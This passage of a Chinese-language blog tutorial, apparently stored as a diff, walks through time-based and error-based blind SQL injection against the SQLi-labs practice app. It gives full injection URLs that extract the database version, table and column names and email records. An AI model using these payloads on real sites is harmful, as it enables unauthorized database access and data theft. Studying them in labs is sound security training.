 <p>按照此步骤可以一次判断其他字段的长度。</p>
 <p><strong>第三步:拆解字段内容</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-9/?id=1&apos; and if(ascii(substr((select id from emails limit 0,1),1,1)) &gt;48,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>获取字段中第一位的字段内容的ascii码值</p>
 <p>当带入值为48时，页面回显时间明显增长，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200210135530847.png" alt="image-20200210135530847"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-9/?id=1&apos; and if(ascii(substr((select id from emails limit 0,1),1,1)) &gt;49,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为49时，页面回显时间正常，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200210135815529.png" alt="image-20200210135815529"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前id字段第一个内容第一位ascii码值为49，即为数字1</p>
@@ -618,15 +653,20 @@
 <p>若要获取库中其他信息，按以上步骤，修改payload中的值即可获取特性的内容。</p>
 <h2 id="3-4-报错盲注"><a href="#3-4-报错盲注" class="headerlink" title="3.4 报错盲注"></a>3.4 报错盲注</h2><h3 id="3-4-1-常用函数详解"><a href="#3-4-1-常用函数详解" class="headerlink" title="3.4.1 常用函数详解"></a>3.4.1 常用函数详解</h3><p>​    见 2.3.2中有详解。</p>
 <h3 id="3-4-2-获取数据版本信息和库名"><a href="#3-4-2-获取数据版本信息和库名" class="headerlink" title="3.4.2 获取数据版本信息和库名"></a>3.4.2 获取数据版本信息和库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="number">0x26</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfv184n7j327y0qyh5e.png" alt="image-20200211152548752"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">database</span>(),<span class="number">0x26</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="/2020/03/09/高级注入（二）/image-20200211152812564.png" alt="image-20200211152812564"></p>
 <h3 id="3-4-3-获取数据库的表名"><a href="#3-4-3-获取数据库的表名" class="headerlink" title="3.4.3 获取数据库的表名"></a>3.4.3 获取数据库的表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x26</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="/2020/03/09/高级注入（二）/image-20200211154642052.png" alt="image-20200211154642052"></p>
 <p>修改对应limit的第一个参数可以获取其他表名。</p>
 <h3 id="3-4-4-获取表中的字段名"><a href="#3-4-4-获取表中的字段名" class="headerlink" title="3.4.4 获取表中的字段名"></a>3.4.4 获取表中的字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shttp://192.168.2.220:8080/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'emails'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x26</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfv7v5d3j327y0oingx.png" alt="image-20200211155003474"></p>
 <h3 id="3-4-5-获取字段中的内容"><a href="#3-4-5-获取字段中的内容" class="headerlink" title="3.4.5 获取字段中的内容"></a>3.4.5 获取字段中的内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-5/?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">id</span>  <span class="keyword">from</span> emails <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">0x26</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfva9c4pj327y0pu4ib.png" alt="image-20200211155609267"></p>
 
       
